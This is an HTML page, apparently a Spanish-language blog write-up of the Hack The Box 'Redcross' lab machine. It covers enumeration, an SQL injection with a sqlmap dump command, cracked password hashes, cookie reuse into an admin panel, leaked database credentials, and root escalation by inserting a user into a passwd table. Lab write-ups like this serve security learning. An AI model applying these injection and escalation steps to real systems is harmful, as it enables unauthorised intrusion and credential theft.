@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hack The Box - Redcross :: sckull — HackTheBox Writeups, CTF</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Nombre Redcross     OS Linux   Puntos 30   Dificultad Medium   IP 10.10.10.113   Maker ompamo      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [8.4,7.9,6.3,3.7,2.1] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://sckull.github.io/posts/redcross/" />
+
+
+<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://sckull.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://sckull.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Hack The Box - Redcross :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Nombre Redcross     OS Linux   Puntos 30   Dificultad Medium   IP 10.10.10.113   Maker ompamo      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [8.4,7.9,6.3,3.7,2.1] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;" />
+<meta name="twitter:site" content="https://sckull.github.io" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="https://sckull.github.io/../../image/htb/redcross/cover.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack The Box - Redcross :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Nombre Redcross     OS Linux   Puntos 30   Dificultad Medium   IP 10.10.10.113   Maker ompamo      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [8.4,7.9,6.3,3.7,2.1] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;" />
+<meta property="og:url" content="https://sckull.github.io/posts/redcross/" />
+<meta property="og:site_name" content="Hack The Box - Redcross" />
+<meta property="og:image" content="https://sckull.github.io/../../image/htb/redcross/cover.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2019-04-13 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+</head>
+<body class="">
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://sckull.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://sckull.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+  <div class="post">
+    <h2 class="post-title"><a href="https://sckull.github.io/posts/redcross/">Hack The Box - Redcross</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            Saturday, Apr 13, 2019
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">Tags:
+        
+         #<a href="https://sckull.github.io/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/nmap/">nmap</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/gobuster/">gobuster</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/sqli/">sqli</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/cookies/">cookies</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/rce/">RCE</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/writeup/">writeup</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="https://sckull.github.io/posts/redcross/../../image/htb/redcross/cover.png" class="post-cover" />
+      
+      <hr />
+     
+    
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Nombre</th>
+<th>Redcross</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>OS</td>
+<td>Linux</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>30</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Medium</td>
+</tr>
+
+<tr>
+<td>IP</td>
+<td>10.10.10.113</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://www.hackthebox.eu/home/users/profile/9631">ompamo</a></td>
+</tr>
+</tbody>
+</table>
+
+<div id="grapher"><canvas id="radar-chart" width="100" height="50"></canvas>
+    <script>
+    new Chart(document.getElementById("radar-chart"), {
+    type: 'radar',
+    data: {
+      labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"],
+      datasets: [
+        {
+          label: "User",
+          fill: true,
+          backgroundColor: "rgba(179,181,198,0.2)",
+          borderColor: "rgba(179,181,198,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(179,181,198,1)",
+          data: [8.4,7.9,6.3,3.7,2.1]
+        }, {
+          label: "Maker",
+          fill: true,
+          backgroundColor: "rgba(255,99,132,0.2)",
+          borderColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          data: [8,8,8,2,2]
+        }
+      ]
+    },
+    options: {
+      title: {
+        display: true,
+        text: 'Calificacion'
+      }
+    }
+});
+    </script>
+</div>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+
+<p>Al realizar el primer escaneo a la maquina obtuvimos lo siguiente y al parecer tiene un subdominio (intra).</p>
+
+<pre><code class="language-shell">Nmap 7.70 scan initiated Mon Jan 14 18:47:33 2019 as: nmap -sC -sV -o tcp 10.10.10.113
+Nmap scan report for 10.10.10.113
+Host is up (0.22s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
+|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
+|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.25
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to https://intra.redcross.htb/
+443/tcp open  ssl/http Apache httpd 2.4.25
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to https://intra.redcross.htb/
+| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
+| Not valid before: 2018-06-03T19:46:58
+|_Not valid after:  2021-02-27T19:46:58
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   http/1.1
+	http/1.1 (1000 Lineas de lo mismo)
+|_  http/1.1
+Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jan 14 19:47:25 2019 -- 1 IP address (1 host up) scanned in 3592.63 seconds
+</code></pre>
+
+<hr />
+
+<h2 id="subdominios">Subdominios</h2>
+
+<p>Agregamos el subdominio intra a nuestro archivo local <code>/etc/hosts</code>.</p>
+
+<pre><code class="language-shell">10.10.10.113	redcross.htb intra.redcross.htb 
+</code></pre>
+
+<p>Al visitar intra.redcross.htb nos muestra un login, podemos probar contraseñas comunes o seguir enumerando la pagina, en este caso el usuario:contraseña que encontramos fue: <code>guest:guest</code>.</p>
+
+<hr />
+
+<h2 id="gobuster">GOBUSTER</h2>
+
+<p>Realizamos una busqueda de los directorios y archivos (php,html,txt,pdf,doc) que podrian estar en la pagina, utilizamos el parametro &lsquo;-k&rsquo; saltarnos la verificacion de SSL de la pagina (-k Skip SSL certificate verification).</p>
+
+<pre><code class="language-shell">gobuster -u https://intra.redcross.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k -np -t 30 -x php,html,txt,pdf,doc
+=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : https://intra.redcross.htb/
+[+] Threads      : 30
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : php,html,txt,pdf,doc
+[+] Timeout      : 10s
+=====================================================
+/documentation (Status: 301)
+/images (Status: 301)
+/index.php (Status: 302)
+/index.php (Status: 302)
+/init.php (Status: 200)
+/javascript (Status: 301)
+/pages (Status: 301)
+=====================================================
+</code></pre>
+
+<p>Se realizo de la misma manera para el directorio <code>/documentation</code> y nos encontramos con un documento.</p>
+
+<pre><code class="language-shell">gobuster -u https://intra.redcross.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -k -np -t 30 -x php,html,txt,pdf,doc
+=====================================================
+account-signup.pdf
+=====================================================
+</code></pre>
+
+<p><img src="../../image/htb/redcross/pdf-account-signup.png" alt="image" /></p>
+
+<p>Nos dice que si queremos un acceso a la plataforma debemos llenar un formulario en <a href="https://intra.redcross.htb/?page=contact">https://intra.redcross.htb/?page=contact</a> con subject &ldquo;credentials&rdquo; y en el cuerpo del formulario la contraseña del usuario que queremos.</p>
+
+<p><img src="../../image/htb/redcross/credenciales-guest.png" alt="image" />
+<img src="../../image/htb/redcross/credenciales-temporales-guest.png" alt="image" /></p>
+
+<hr />
+
+<h2 id="sqli">SQLI</h2>
+
+<p>Nos logueamos con el usuario y contraseña, al analizar los directorios y paginas, encontramos una vulnerabilidad SQLi en: <code>https://intra.redcross.htb/?o=1'-- -&amp;page=app</code></p>
+
+<p><img src="../../image/htb/redcross/vulnerabilidad-sqli-1.png" alt="image" /></p>
+
+<p>Utilizamos burpsuite para capturar el trafico y capturar una solicitud de la SQLi para luego hacer uso de sqlmap con la solicitud, para luego encontrar usuarios y contraseñas, tambien encontramos mensajes de correos electronicos entre los <code>administradores</code>.</p>
+
+<pre><code class="language-text">GET /?o=1&amp;page=app HTTP/1.1
+Host: intra.redcross.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://intra.redcross.htb/?page=app
+Cookie: PHPSESSID=vo690q6cktgv56j97dabra5bm3; LANG=EN_US; SINCE=1547616286; LIMIT=10; DOMAIN=intra
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre>
+
+<hr />
+
+<h2 id="sqlmap">SQLMAP</h2>
+
+<pre><code class="language-bash">sqlmap -r sql.req --batch --level=5 --risk=3 -D redcross -T users --dump
+</code></pre>
+
+<pre><code class="language-shell">Database: redcross
+Table: users
+[5 entries]
++----+------+------------------------------+----------+--------------------------------------------------------------+
+| id | role | mail                         | username | password                                                     |
++----+------+------------------------------+----------+--------------------------------------------------------------+
+| 1  | 0    | admin@redcross.htb           | admin    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. |
+| 2  | 1    | penelope@redcross.htb        | penelope | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS |
+| 3  | 1    | charles@redcross.htb         | charles  | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i |
+| 4  | 100  | tricia.wanderloo@contoso.com | tricia   | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. |
+| 5  | 1000 | non@available                | guest    | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi |
++----+------+------------------------------+----------+--------------------------------------------------------------+
+</code></pre>
+
+<pre><code class="language-shell">Database: redcross
+Table: messages
+[8 entries]
+id,body,dest,origin,subject
+1,You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.,5,1,Guest Account Info
+2,&quot;Hi Penny, can you check if is there any problem with the order? I'm not receiving it in our EDI platform.&quot;,2,4,Problems with order 02122128
+3,&quot;Please could you check the admin webpanel? idk what happens but when I'm checking the messages, alerts popping everywhere!! Maybe a virus?&quot;,3,1,Strange behavior
+4,&quot;Hi, Please check now... Should be arrived in your systems. Please confirm me. Regards.&quot;,4,2,Problems with order 02122128
+5,&quot;Hey, my chief contacted me complaining about some problem in the admin webapp. I thought that you reinforced security on it... Alerts everywhere!!&quot;,2,3,admin subd webapp problems
+6,&quot;Hi, Yes it's strange because we applied some input filtering on the contact form. Let me check it. I'll take care of that since now! KR&quot;,3,2,admin subd webapp problems (priority)
+7,&quot;Hi, Please stop checking messages from intra platform, it's possible that there is a vuln on your admin side... &quot;,1,2,STOP checking messages from intra (priority)
+8,Sorry but I can't do that. It's the only way we have to communicate with partners and we are overloaded. Doesn't look so bad... besides that what colud happen? Don't worry but fix it ASAP.,2,1,STOP checking messages from intra (priority)
+</code></pre>
+
+<p>Con la vulnerabilidad SQLi solo se pudo sacar mensajes y usuarios, no se pudo ir más alla (shell, lectura, escritura de archivos,etc). Intentando crackear las contraseñas con hashcat solo logramos sacar dos pero no sirvieron de mucho:</p>
+
+<pre><code class="language-shell">guest:$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi:guest
+charles:$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i:cookiemonster
+</code></pre>
+
+<p>Pero los mensajes nos dan una idea de lo que podriamos hacer, hablan de <code>admin webpanel</code> el cual no pudimos encontrar con gobuster, pero podria ser algo más que un directorio, un subdominio.</p>
+
+<pre><code class="language-shell">10.10.10.113	redcross.htb intra.redcross.htb admin.redcross.htb webpanel.redcross.htb
+</code></pre>
+
+<p>Al visitar <code>webpanel.redcross.htb</code> solo nos redirige de nuevo a <code>intra.redcross.htb</code>, pero si visitamos <code>admin.redcross.htb</code>, nos muestra un nuevo panel de administracion.</p>
+
+<p><img src="../../image/htb/redcross/admin-redcross-panel.png" alt="image" /></p>
+
+<p>Intentamos utilizar los mismos credenciales pero nos muestra un mensaje:</p>
+
+<pre><code class="language-shell">Not enough privileges!
+</code></pre>
+
+<hr />
+
+<h2 id="cookies">COOKIES</h2>
+
+<p>Ya que el subdominio intra y admin pertenecen a la misma maquina intentamos utilizar las cookies del subdominio intra en el de admin utilizando <code>Cookie Manager</code> con los cuales pudimos logearnos como usuario <code>guest</code>.</p>
+
+<p><img src="../../image/htb/redcross/admin-panel2.png" alt="image" /></p>
+
+<p>Observamos dos <code>User Management, Network Access</code>, en la primera opcion podemos borrar y agregar usuarios, y el server nos genera una contraseña que podemos utilizar para logearnos mediante ssh.</p>
+
+<p>Agregamos un Usuario
+<img src="../../image/htb/redcross/admin-panel-user.png" alt="image" /></p>
+
+<p>Nos devuelve el usuario y contraseña
+<img src="../../image/htb/redcross/admin-panel-create-user.png" alt="image" /></p>
+
+<p>Nos logeamos con las credenciales al servicio ssh
+<img src="../../image/htb/redcross/admin-create-user-ssh-login.png" alt="image" /></p>
+
+<p>Con el usuario que creamos(nemesis) no pudimos hacer mucho, pero encontramos un archivo &lsquo;iptctl.c&rsquo;, el cual restringe o permite el acceso a la maquina, añadiendo una IP.</p>
+
+<pre><code class="language-c">/*
+ * Small utility to manage iptables, easily executable from admin.redcross.htb
+ * v0.1 - allow and restrict mode
+ * v0.3 - added check method and interactive mode (still testing!)
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;unistd.h&gt;
+#define BUFFSIZE 360
+
+int isValidIpAddress(char *ipAddress)
+{
+    	struct sockaddr_in sa;
+    	int result = inet_pton(AF_INET, ipAddress, &amp;(sa.sin_addr));
+	return result != 0;
+}
+
+int isValidAction(char *action){
+	int a=0;
+	char value[10];
+	strncpy(value,action,9);
+	if(strstr(value,&quot;allow&quot;)) a=1;
+	if(strstr(value,&quot;restrict&quot;)) a=2;
+	if(strstr(value,&quot;show&quot;)) a=3;
+	return a;
+}
+
+void cmdAR(char **a, char *action, char *ip){
+	a[0]=&quot;/sbin/iptables&quot;;
+	a[1]=action;
+	a[2]=&quot;INPUT&quot;;
+       	a[3]=&quot;-p&quot;;
+       	a[4]=&quot;all&quot;;
+       	a[5]=&quot;-s&quot;;
+	a[6]=ip;
+	a[7]=&quot;-j&quot;;
+       	a[8]=&quot;ACCEPT&quot;;
+	a[9]=NULL;
+	return;
+}
+
+void cmdShow(char **a){
+	a[0]=&quot;/sbin/iptables&quot; ;
+	a[1]=&quot;-L&quot;;
+       	a[2]=&quot;INPUT&quot;;
+	return;
+}
+
+void interactive(char *ip, char *action, char *name){
+	char inputAddress[16];
+	char inputAction[10];
+	printf(&quot;Entering interactive mode\n&quot;);
+	printf(&quot;Action(allow|restrict|show): &quot;);
+	fgets(inputAction,BUFFSIZE,stdin);
+	fflush(stdin);
+	printf(&quot;IP address: &quot;);
+	fgets(inputAddress,BUFFSIZE,stdin);
+	fflush(stdin);
+	inputAddress[strlen(inputAddress)-1] = 0;
+	if(! isValidAction(inputAction) || ! isValidIpAddress(inputAddress)){
+		printf(&quot;Usage: %s allow|restrict|show IP\n&quot;, name);
+		exit(0);
+	}
+	strcpy(ip, inputAddress);
+	strcpy(action, inputAction);
+	return;
+}
+
+int main(int argc, char *argv[]){
+	int isAction=0;
+	int isIPAddr=0;
+	pid_t child_pid;
+	char inputAction[10];
+	char inputAddress[16];
+	char *args[10];
+	char buffer[200];
+
+	if(argc!=3 &amp;&amp; argc!=2){
+		printf(&quot;Usage: %s allow|restrict|show IP_ADDR\n&quot;, argv[0]);
+		exit(0);
+	}
+	if(argc==2){
+		if(strstr(argv[1],&quot;-i&quot;)) interactive(inputAddress, inputAction, argv[0]);
+	}
+	else{
+		strcpy(inputAction, argv[1]);
+		strcpy(inputAddress, argv[2]);
+	}
+	isAction=isValidAction(inputAction);
+	isIPAddr=isValidIpAddress(inputAddress);
+	if(!isAction || !isIPAddr){
+		printf(&quot;Usage: %s allow|restrict|show IP\n&quot;, argv[0]);
+		exit(0);
+	}
+	puts(&quot;DEBUG: All checks passed... Executing iptables&quot;);
+	if(isAction==1) cmdAR(args,&quot;-A&quot;,inputAddress);
+	if(isAction==2) cmdAR(args,&quot;-D&quot;,inputAddress);
+	if(isAction==3) cmdShow(args);
+	
+	child_pid=fork();
+	if(child_pid==0){
+		setuid(0);
+		execvp(args[0],args);
+		exit(0);
+	}
+	else{
+		if(isAction==1) printf(&quot;Network access granted to %s\n&quot;,inputAddress);
+		if(isAction==2) printf(&quot;Network access restricted to %s\n&quot;,inputAddress);
+		if(isAction==3) puts(&quot;ERR: Function not available!\n&quot;);
+	}
+}
+</code></pre>
+
+<p>Este archivo es utilizado en la segunda opcion del panel de administracion en <code>Network Access</code>, al acceder a la segunda opcion nos muestra las ip que fueron agregada a la lista, en la que tambien podemos denegar el acceso a una IP.</p>
+
+<p><img src="../../image/htb/redcross/admin-access-firewall.png" alt="image" /></p>
+
+<hr />
+
+<h2 id="rce-reverse-shell">RCE - Reverse SHELL</h2>
+
+<p>El archivo que encontramos anteriormente fue compilado y probado localmente, el cual nos pide una opcion y una IP a la cual queremos autorizar|restringir|mostrar y al realizar un analisis a las peticiones al servidor con &lsquo;Burpsuite&rsquo; de esta pagina encontramos que podemos realizar una &lsquo;Inyeccion de Comandos&rsquo; mediante la opcion de denegar (&lsquo;deny&rsquo;) una IP y asi obtener una shell inversa con python.
+<a href="https://www.owasp.org/index.php/Command_Injection"><strong>Command_Injection</strong></a></p>
+
+<video width="936" height="542" autoplay>
+  <source src="../../image/htb/redcross/RCE-redcross-video.mp4" type="video/mp4">  
+  Your browser does not support the video tag.
+</video> 
+
+<hr />
+
+<h2 id="directorios-pagina-web">DIRECTORIOS PAGINA WEB</h2>
+
+<p>Ya dentro de la maquina pudimos enumerar y descargar los archivos pertenecientes a la pagina web y su estructura es la siguiente.</p>
+
+<p><img src="../../image/htb/redcross/anexo-php.png" alt="image" /></p>
+
+<hr />
+
+<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+
+<h3 id="creando-un-usuario-root">Creando un Usuario - ROOT</h3>
+
+<p>Enumerando los archivos que se manejan en <code>/var/www/html/*</code> los cuales pertenecen a la pagina web de la maquina, encontramos varios usuarios y contraseñas a Bases de Datos.</p>
+
+<pre><code class="language-php">actions.php
+&quot;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;&quot;
+&quot;host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&amp;&quot;
+&quot;host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw&quot;
+</code></pre>
+
+<pre><code class="language-php">init.php
+$dbhost='127.0.0.1'; $dbuser='dbcross'; $dbpass='LOSPxnme4f5pH5wp';$dbname='redcross';
+</code></pre>
+
+<p>Como pudimos observar, en el panel de administracion podemos crear usuarios, los cuales estan en el grupo de asociados y limitados a una sola carpeta /var/jail/. El codigo php que agrega usuarios a la base de datos.</p>
+
+<pre><code class="language-php">if($action==='adduser'){
+	$username=$_POST['username'];
+	$passw=generateRandomString();
+	$phash=crypt($passw);
+	$dbconn = pg_connect(&quot;host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&amp;&quot;);
+	$result = pg_prepare($dbconn, &quot;q1&quot;, &quot;insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')&quot;);
+	$result = pg_execute($dbconn, &quot;q1&quot;, array($username, $phash));
+	echo &quot;Provide this credentials to the user:&lt;br&gt;&lt;br&gt;&quot;;
+	&lt;--!echo &quot;&lt;b&gt;$username : $passw&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;a href=https://sckull.github.io/?page=users&gt;Continue&lt;/a&gt;&quot;;--&gt;
+}
+</code></pre>
+
+<p>El <code>action: adduser</code> realiza una conexion a la base de datos <code>unix</code> y con el usuario &lsquo;unixusrmgr&rsquo; y realiza un query para insertar nombre de usuario, contraseña generada aleatoriamente y la encripta en <code>crypt</code>, gid o al grupo de usuarios que existen en la maquina (<code>/etc/group - associates:x:1001:</code>), tambien un directorio especifico para el usuario. Sabiendo esto podemos tomar ventaja de esta funcion y crear nuestro propio usuario.</p>
+
+<p>Utilizando las mismas credenciales en la base de datos en la que se crean los usuarios, encontramos la tabla llamada <code>passwd_table</code>, que contiene:</p>
+
+<pre><code class="language-shell">   username    |               passwd               | uid  | gid  | gecos |    homedir     |   shell   
+---------------+------------------------------------+------+------+-------+----------------+-----------
+	...							....				...		...		....	....				...
+ greater       | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2022 |    0 |       | /root          | /bin/bash
+ mailadm       | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2024 | 1000 |       | /home/penelope | /bin/bash
+ slot          | $1$Zjw7H894$4mUPW1tgQmV5QVKUIOeKZ/ | 2027 | 1001 |       | /var/jail/home | /bin/bash
+ shadow        | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2029 |   42 |       | /home/         | /bin/bash
+ goku          | $1$bRaICuCW$oRz.QUxie1yqP5Jbi3Z1v/ | 2033 |   27 |       | /home/         | /bin/bash
+ adm           | $1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/ | 2034 |    4 |       | /home/penelope | /bin/bash
+</code></pre>
+
+<p>Ya que el usuario <code>unixusrmgr</code> tiene permisos para insertar datos en esta tabla, podemos tomar ventaja e insertar nuestro propio usuario con permisos sudo a la base de datos, logearnos mediante ssh para luego poder crear y agregar un usuario con permisos(gid) root a la maquina.</p>
+
+<pre><code class="language-shell">/usr/lib/postgresql/9.6/bin/psql -h 127.0.0.1 -U unixusrmgr unix
+Password: dheu%7wjx8B&amp;
+</code></pre>
+
+<p>Para crear la contraseña utilizamos la siguiente pagina: <a href="https://es.functions-online.com/crypt.html"><strong>crypt</strong></a></p>
+
+<pre><code class="language-shell">$1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/:greatstuff
+</code></pre>
+
+<h3 id="sql-insert">SQL - INSERT</h3>
+
+<pre><code class="language-sql">insert into passwd_table(username, passwd, gid, homedir) values('batman', '$1$Ca4NB5YL$1VBlUqIoGQg.LSqbiZ7FY/', '27', '/root');
+</code></pre>
+
+<hr />
+
+<h2 id="crear-usuario-sudo">Crear Usuario Sudo</h2>
+
+<pre><code class="language-bash">sudo useradd -ou 0 -g 0 happy
+sudo passwd happy
+su happy
+</code></pre>
+
+<p><a href="https://www.shellhacks.com/how-to-grant-root-access-user-root-privileges-linux/"><strong>Grant root access</strong></a></p>
+
+<video autoplay>
+  <source src="../../image/htb/redcross/privilege-escalation-FINAL.mp4" type="video/mp4">  
+  Your browser does not support the video tag.
+</video> 
+
+<h3 id="sudo-ツ">Sudo ¯_(ツ)_/¯</h3>
+
+<p>Pudimos haber hecho solamente <code>sudo bash</code> y obteniamos una shell root #meh.</p>
+
+    </div>    
+    <hr />
+    <div >
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+            <span class="button previous">
+              <a href="https://sckull.github.io/posts/teacher/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Hack The Box - Teacher</span>
+              </a>
+            </span>
+          
+          
+            <span class="button next">
+              <a href="https://sckull.github.io/posts/vault/">
+                <span class="button__text">Hack The Box - Vault</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    </div>
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
